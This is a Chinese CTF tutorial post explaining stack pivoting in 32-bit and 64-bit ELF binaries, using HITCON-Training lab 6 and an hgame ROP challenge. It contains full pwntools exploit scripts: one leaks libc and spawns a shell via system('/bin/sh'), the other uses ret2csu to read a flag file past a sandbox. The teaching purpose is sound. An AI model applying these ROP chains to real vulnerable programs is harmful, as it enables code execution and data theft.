原创紫色仰望合天智汇

## 前言  

这次来学习下栈迁移技术吧，全片构成 为 先了解原理，然后再分别以 32位程序 及 64位 程序 以图文的形式 来具体学习！

## 原理  

栈迁移 正如它所描述的，该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。 我们可利用该技巧来解决栈溢出空间大小不足的问题。

我们进入 一个 函数的 时候，会执行 call 指令

call func(); //push eip+4; push ebp; mov ebp,esp;

call func() 执行完 要退出的 时候 要进行 与 call func 相 反 的 操作（ 恢复现场）维持栈平衡！

leave; //mov esp,ebp; pop ebp; ret ; // pop eip

栈迁移 的核心思想就是 将栈 的 esp 和 ebp 转移到一个 输入不受长度限制的 且可控制 的 址处，通常是 bss 段地址！ 在最后 ret 的时候
如果我们能够控制得 了 栈顶 esp指向的地址 就想到于 控制了 程序执行流！

这里有个 很好的描述，建议大家可以去看下：

https://blog.csdn.net/yuanyunfeng3/article/details/51456049

## 32位程序 栈迁移  

这里 我拿 HITCON-Training-master 中的lab 6 进行 超详细的分析，希望能给在学这个内容的 兴趣者们提供帮助！

file migration ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
dynamically linked, interpreter /lib/ld-,for GNU/Linux 2.6.32,
BuildID[sha1]=e65737a9201bfe28db6fe46f06d9428f5c814951, not stripped

checksec migration Arch: i386-32-little RELRO: Full RELRO Stack: No canary
found NX: NX enabled PIE: No PIE (0x8048000)

开启了 NX保护 的 32位 的 elf程序

拖入ida：

int __cdecl main(int argc, const char **argv, const char **envp) { char buf;
// [esp+0h] [ebp-28h] if ( count != 1337 ) exit(1); ++count;
setvbuf(_bss_start, 0, 2, 0); puts("Try your best :"); return read(0, &buf,
0x40u); //存在栈溢出 漏洞 }

程序流程很简单 我们 想 栈中 最多 输入 0x40 字节内容，然后停止 ! 程序 不循环！

我们进入 一个 函数的 时候，会执行 call 指令

call func(); //push eip+4; push ebp; mov ebp,esp;

call func() 执行完 要退出的 时候 要进行 与 call func 相 反 的 操作（ 恢复现场）维持栈平衡！

leave; //mov esp,ebp; pop ebp; ret ; // pop eip

我们首先先把 完整的 exp 放上来然后 分步 详细地 对其进行讲解！

#coding:utf8 from pwn import* context.log_level="debug" p =
process('./migration') libc = ELF('/lib/i386-linux-gnu/libc.so.6') elf =
ELF('./migration') read_plt = elf.symbols['read'] puts_plt =
elf.symbols['puts'] puts_got = elf.got['puts'] read_got = elf.got['read'] buf
= elf.bss() + 0x500 buf2 = elf.bss() + 0x400 pop_ebx_ret = 0x804836d
pop_esi_edi_ebp_ret = 0x8048569 leave_ret = 0x08048418 #ida 中 查看 puts_libc =
libc.symbols['puts'] system_libc = libc.symbols['system'] binsh_libc =
libc.search("/bin/sh").next() log.info("read_plt:"+hex(read_plt))
log.info("puts_plt:"+hex(puts_plt)) log.info("puts_got:"+hex(puts_got))
log.info("read_got:"+hex(read_got)) log.info("buf:"+hex(buf))
log.info("buf2:"+hex(buf2)) log.info("pop_ebx_ret:"+hex(pop_ebx_ret))
log.info("pop_esi_edi_ebp_ret:"+hex(pop_esi_edi_ebp_ret))
log.info("leave_ret:"+hex(leave_ret)) log.info("puts_libc:"+hex(puts_libc))
log.info("system_libc:"+hex(system_libc)) #gdb.attach(p,'b *0x080484EA')
p.recvuntil("Try your best :\n") log.info("***第一个讲解： 将栈中 esp,ebp 转移到 bss 地址
处*********************") payload_1 = 'a'*0x28 + p32(buf) + p32(read_plt) +
p32(leave_ret) + p32(0) + p32(buf) + p32(0x100) p.send(payload_1)
log.info("*****第二个讲解：泄露libc_base********************") payload_2 = p32(buf2) +
p32(puts_plt) + p32(pop_ebx_ret) + p32(puts_got) + p32(read_plt) +
p32(leave_ret) payload_2+= p32(0) + p32(buf2) + p32(0x100) p.send(payload_2)
puts_add = u32(p.recv(4)) libc_base = puts_add - puts_libc
log.info("libc_base:"+hex(libc_base)) system_add = libc_base + system_libc
log.info("system_add:"+hex(system_add)) binsh_addr = libc_base + binsh_libc
log.info("**************获得shell*********************") payload_3 = p32(buf) +
p32(system_add) + 'bbbb' + p32(binsh_addr) p.send(payload_3) p.interactive()

这个程序的gadget很少，但刚刚够用：

$ ROPgadget --binary migration --only 'pop|ret' Gadgets information
============================================================ 0x0804856b : pop
ebp ; ret 0x08048568 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x0804836d
: pop ebx ; ret 0x0804856a : pop edi ; pop ebp ; ret 0x08048569 : pop esi ;
pop edi ; pop ebp ; ret 0x08048356 : ret 0x0804842e : ret 0xeac1 Unique
gadgets found: 7

运行后的

![v2-60499c023807b2ddac5e6237e050192c_720w](https://pic4.zhimg.com/80/v2-60499c023807b2ddac5e6237e050192c_720w.png)

## 讲解 1  

payload_1 = 'a'*0x28 + p32(buf) + p32(read_plt) + p32(leave_ret) + p32(0) +
p32(buf) + p32(0x100) p.send(payload_1)

我们可以往栈上 输入 0x40字节内容， 从ida中 可以知道 我们 其实当输入 0x28字节内容之后，如果再输入就是要 覆盖 ebp 地址了，接着 是
ret_addr. 输入输入到栈上的 对应关系就是这个样子：

![v2-7c65446e8b15507cf6ff7bae3e075368_720w](https://pic4.zhimg.com/80/v2-7c65446e8b15507cf6ff7bae3e075368_720w.png)

EBP：0xff8845b8

ESP: 0xff884590

leave; //mov esp,ebp; pop ebp; ret ; // pop eip 因为pop出栈 了，所以ESP地址在这里 也会 +4

所以，执行完 这两条命令后，

EBP：0x804a50c //即目前我们 ebp 已经被转移到 bss_addr+0x500处了！

ESP: 0xff8845b8+4 +4=0xff8845c0

![v2-aadede84eb31487a58ac998679ca05b6_720w](https://pic4.zhimg.com/80/v2-aadede84eb31487a58ac998679ca05b6_720w.png)

注意，执行完后 ret 指令 使得 程序返回到了0x8048380 处然后 执行 read_plt(0,buf,0x100) 去了 ！

所以 我们是在 向 buf：0x804a50c（ bss_addr+0x500）即 ebp 地址处 写入 payload_2 后才会 返回 ret 去 执行
当前栈顶地址处的 leave //这也是 图中说 待会的 原因！

所以此时 0x804a50c处 已经 被写入了 buf2 = elf.bss() + 0x400 即 0x804a40c

![v2-a7a563f24f96d9973c730ec79c33e30a_720w](https://pic2.zhimg.com/80/v2-a7a563f24f96d9973c730ec79c33e30a_720w.png)

然后去 执行 栈顶处的 leave

leave; //mov esp,ebp; pop ebp; ret ; // pop eip 因为pop出栈 了，所以ESP地址在这里 也会 +4

猜测 执行 过后的 结果为下面的样子：

esp: 0x804a50c - 4-4 = 0x804a514 ebp: 0x804a40c

看下面截图，发现 符合我们的 推测！

图中 0x804838c（put_plt 的地址） 是 我们 payload_2中 发送的 内容 。

![v2-2afed9ccde39e99905e8f949e9bcb295_720w](https://pic1.zhimg.com/80/v2-2afed9ccde39e99905e8f949e9bcb295_720w.png)

这里 我们要 特别注意 一点，在leave 执行 的 时候，（看它本质）当 mov esp,ebp 后 就已经实现 将 将 esp 控制在 ebp处了
即再执行 ret 命令的话，就已经完成了 将eip 控制在 一个输入不受长度限制 且可 rwx 处的 地址了，那么 此时 leave 本质中的 pop
ebp 就是 多余的了吗？

嗯...,因为 目前 我们 还只是 完成了 栈的一次 迁移，还没有进行攻击呢，要想攻击，我们还得 获得 libc 加载的基地址，继而 拿到 system
函数加载地址和 '/bin/sh\x00'字符串 地址才可以 ！

于是 我们需要接着 利用这个 pop ebp 指令，向 ebp 传值 buf2（0x8049fe8）接着 迁移，目的是利用 puts 函数 泄露
puts_got.

## 讲解二：  

payload_2 = p32(buf2) + p32(puts_plt) + p32(pop_ebx_ret) + p32(puts_got) +
p32(read_plt) + p32(leave_ret) payload_2+= p32(0) + p32(buf2) + p32(0x100)
p.send(payload_2)

顺着上面接着 分析，此时程序 在执行 puts(puts_got) ， 我们可以利用 程序 输出的结果 （puts函数在内存中的加载地址）进而计算出
libc 加载的 基地址（上面说过了，哈）。

这里的 pop_ebx_ret 的作用呢 其实就是把 p32(puts_got) 给从栈中 取出来，进而实现 接下来 执行
read_plt(0,buf,0x100) 函数 构造 最后的 攻击 代码 即我们的 payload_3。

payload_3 = p32(buf) + p32(system_add) + 'bbbb' + p32(binsh_addr)

所以 再 当 执行到 payload_2 中的 leave_ret 时 buf2 （0x804a40c）处 即 ebp的地址 已经 写入了
0x804a50c （buf）

![v2-91e24ca6ed6e259f0a9370bd25db6bb7_720w](https://pic2.zhimg.com/80/v2-91e24ca6ed6e259f0a9370bd25db6bb7_720w.png)

read函数结束后，我们又要 接着 执行 我们构造的 leave_ret 了

![v2-6e28e6fca404f7afd2bc1c42dd454cb1_720w](https://pic3.zhimg.com/80/v2-6e28e6fca404f7afd2bc1c42dd454cb1_720w.png)

leave; //mov esp,ebp; pop ebp; ret ; // pop eip 因为pop出栈 了，所以ESP地址在这里 也会 +4

推测执行后：

ebp=0x804a50c esp= 0x804a40c+4 +4 =0x804a414

![v2-f457bd0e2bdde8e372fc841fc19f4ef9_720w](https://pic2.zhimg.com/80/v2-f457bd0e2bdde8e372fc841fc19f4ef9_720w.png)

这里 leave 本质中的 pop ebp 就是 其实 就是把 0x804a50c又赋值给ebp 了

我们最后来看下 payload_3 leave指令完成后 ret当 栈顶 system_addr处，

payload_3 = p32(buf) + p32(system_add) + 'bbbb' + p32(binsh_addr)

即可以 直接 执行 拿到shell 了！

![v2-5cceef348d2df18f824db169d06239a5_720w](https://pic2.zhimg.com/80/v2-5cceef348d2df18f824db169d06239a5_720w.png)

## 64位 栈迁移  

理解 32的栈迁移后 64位 就容易理解了

它们原理其实和32位程序差不多，最大的区别 应该就是 它们调用函数 时传参的方式 不一样！

> 32位 是将参数 依次 从右向左 放入栈中 。 64位程序 传参的时候是 从左到右 依次放入 寄存器：rdi，rsi，rdx，rcx，r8，r9
> ，当参数大于等于 7 的时候 后面参数会依次 从右向左 放入栈中！  
>

在64位 栈迁移的 姿势 经常 会使用 libc_csu_init 中的 gadgets， 下面这题 hgame week3 中的 ROP 就是这样！这里
就 主要 讲其中的栈迁移的部分了！

这题其实 我没有做得出来， 是比赛结束后 看大考捞的 博客才 复现出来的，我太弱了！ 参考：大佬博客！！！

https://fmyy.pro/2020/01/22/Competition/HGame/#Week-THR

首先 拖入ida：

![v2-3ea9b06be28943f3e173bf8691e17e0c_720w](https://pic1.zhimg.com/80/v2-3ea9b06be28943f3e173bf8691e17e0c_720w.png)

ida 中 看，我们 可以执行两次 输入， 第一次 向bss 段 做多可写 0x100字节的 内容！

第二次 向 栈中 最多 输入 0x60字节内容 ，存在 栈溢出，可覆盖

rbp 和ret_addr但 因为沙箱 原因，禁用 用了 execve 函数，我们于是 可以利用 利用ORW直接读flag文件，溢出空间 但太小 这里我们
考虑 栈迁移 到bss 段上 然后在rop攻击！

首先打开服务器中 flag文件然后再把里面的内容给 打印到屏幕上！

#coding:utf8 from pwn import *
context(arch="amd64",os='linux',log_level="debug") p = process('./ROP') #p =
remote('47.103.214.163',20300) elf = ELF('ROP') puts_plt = elf.plt['puts']
open_got = elf.got['open'] read_got = elf.got['read'] leave_ret = 0x40090D buf
= 0x6010A0 #ida pop_rdi_ret = 0x400A43 #ROPgadget --binary ROP --only
"pop|ret" pop_rbx_rbp_r12_r13_r14_r15_ret = 0x400A3A # csu_gadget 第二段 FLAG =
elf.bss()+0x200 print hex(elf.bss()) log.info("puts_plt:"+ str(hex(puts_plt)))
log.info("open_got:"+ str(hex(open_got))) log.info("read_got:"+
str(hex(read_got))) log.info("leave_ret:"+ str(hex(leave_ret)))
log.info("buf:"+ str(hex(buf))) log.info("pop_rdi_ret:"+
str(hex(pop_rdi_ret))) log.info("pop_rbx_rbp_r12_r13_r14_r15_ret:"+
str(hex(pop_rbx_rbp_r12_r13_r14_r15_ret))) log.info("FLAG:"+ str(hex(FLAG)))
print
"****************************************************************************************"
#gdb.attach(p) p.recvuntil('It's just a little bit harder...Do you think so?')
payload = '/flag\x00\x00\x00' payload +=
p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(open_got)+p64(0)+p64(0)+p64(buf)+p64(0x400A20)+2*p64(0)+p64(1)+p64(0)*(6+1-3)
payload +=
p64(pop_rbx_rbp_r12_r13_r14_r15_ret+2)+p64(read_got)+p64(0x20)+p64(FLAG)+p64(4)+p64(0x400A20)+2*p64(0)+p64(1)+p64(0)*(6+1-3)
payload += p64(pop_rdi_ret)+p64(FLAG)+p64(puts_plt) p.send(payload)
p.recvuntil('\n') p.recvuntil('\n') payload_2 = 'U'*0x50 +
p64(buf)+p64(leave_ret) #栈迁移 关键！是不是和32 位的栈迁移利用惊奇的相似，利用原理都是一样的
p.sendline(payload_2) p.recv(100) #p.close() p.interactive()

ida中 最后一个read 函数 存在栈溢出漏洞，我们控制 ebp从而 进行栈迁移 当我们 发送 payload_2 后

buf 就覆盖了 原本的 rbp 的内容，而leave_ret 就覆盖了 原本的 ret_addr 处的内容 ！看下图，

![v2-521546ee9fef65890bd6854e23b087e7_720w](https://pic1.zhimg.com/80/v2-521546ee9fef65890bd6854e23b087e7_720w.png)

这里便是 实现了 执行 2 次 leave ,（在本来程序结束前有执行了一次）达到栈迁移的 实现！

执行 第一次 leave的 时候 重点观察上图中 黄色框框 中的变化！

leave; //mov rsp,rep; pop rbp; 因为pop ebp，所以 rsp 要+8 ret ; // pop rip

当执行过 leave 后 推测

rsp： rsp=0x7ffda85406b0+8 即 0x7ffda85406b8 rbp： rbp = 0x6010a0

验证下：

![v2-1ac5a3d***eaeaf3499663f5b8d3fe85_720w](https://pic4.zhimg.com/80/v2-1ac5a3d***eaeaf3499663f5b8d3fe85_720w.png)

哦哦，上图 执行ret 后，因为本质 是pop rip ，所以rsp + 8

rsp： rsp=0x7ffda85406b8+8 即 0x7ffda85406c0 rbp： rbp = 0x6010a0

所以 当接下来 ret 到 栈顶位置指向的地址 0x40090d ，便又要执行一次 leave，在这个leave后仍然 有个 ret 。

继续推测下 执行 这个（我们构造的） leave 后的 rsp 和 rbp 吧 ！

rsp： rsp=0x6010a0+8 即 0x6010a8 rbp： rbp = 0x67616c662f //此为 第一个payload 第一个的
8字节内容

然后 ret

rsp： rsp=0x6010a8+8 即 0x6010b0 //(buf+16) rbp： rbp = 0x67616c662f //此为
第一个payload 第一个的 8字节内容

所以，基于上面分析，再执行一次 leave 便可以 将 使得 rsp 的地址位于 bss段上去了，然后再ret 返回到
rsp执行到地址内容，就实现了一次栈迁移了。

现在 的时候，我们就可以 几乎没有 输入长度的限制 而去 构造rop了，然后便可以 利用rop 攻击链 把flag中 文件 open到 文件操作符 4
中（因为前面程序已经用 open 打开一次some_life_experience了），

为了接下来大家理解学习通常 ，我把上第一个 payload 放在这里

payload = '/flag\x00\x00\x00' payload +=
p64(pop_rbx_rbp_r12_r13_r14_r15_ret)+p64(0)+p64(1)+p64(open_got)+p64(0)+p64(0)+p64(buf)+p64(0x400A20)+2*p64(0)+p64(1)+p64(0)*(6+1-3)
payload +=
p64(pop_rbx_rbp_r12_r13_r14_r15_ret+2)+p64(read_got)+p64(0x20)+p64(FLAG)+p64(4)+p64(0x400A20)+2*p64(0)+p64(1)+p64(0)*(6+1-3)
payload += p64(pop_rdi_ret)+p64(FLAG)+p64(puts_plt)

这个 主要就说再说下 payload中的 0x400A20 其实就是 libc_csu_init gadget中的 0x400A44 返回到的 地址处！
为了实现 对参数 的赋值。 这是栈溢出 中 的 ret2csu 具体 可在ctfwiki中 学下

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/

![v2-ae828238de7c4a64e55c6a6ac3cd6ff4_720w](https://pic2.zhimg.com/80/v2-ae828238de7c4a64e55c6a6ac3cd6ff4_720w.png)

400a3a处 执行完 ret 返回 到400A20

![v2-1cabbde9751aa7ca80c5a2dddfa4a734_720w](https://pic3.zhimg.com/80/v2-1cabbde9751aa7ca80c5a2dddfa4a734_720w.png)

到 call qword[r12 + rbx*8] 因为 rbx被我们值为 0了 相当于 执行 open（"/flag",0,0）了。

所以 会返回 4 赋值给rax ，因为 在程序最开始 已经使用open函数 打开 一次some_life_experience文件了。

因为 rbx+1 = rbp 所以在地址 0x400a29处并 不会进行 call 操作，继续向下 执行， 也就是意味 着 我们可以 再次构造。

就是 构造 再从文件 操作符 4 read 到 flag 地址处，最后 再调用 puts 函数 把它 打印到屏幕上！因为 主要讲 栈迁移的
，后面就不说了，大家可以自己调试学习下。

## 多调试  

这次 主要是学习 栈迁移的，建议 初学者的话，亲自多调试调试或者 在纸上 用笔 画一画，更有助理解，我最初学这部分时也是迷瞪好久，希望可以 这篇可以
给你们带来些 帮助！

32位&64位栈迁移的学习 相关实验：高级栈溢出技术—ROP实战

[课程:高级栈溢出技术-ROP实战(合天网安实验室)](http://www.hetianlab.com/cour.do?w=1&c=CCID31b0-fe03-4277-8e2f-504c4960d33f)

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

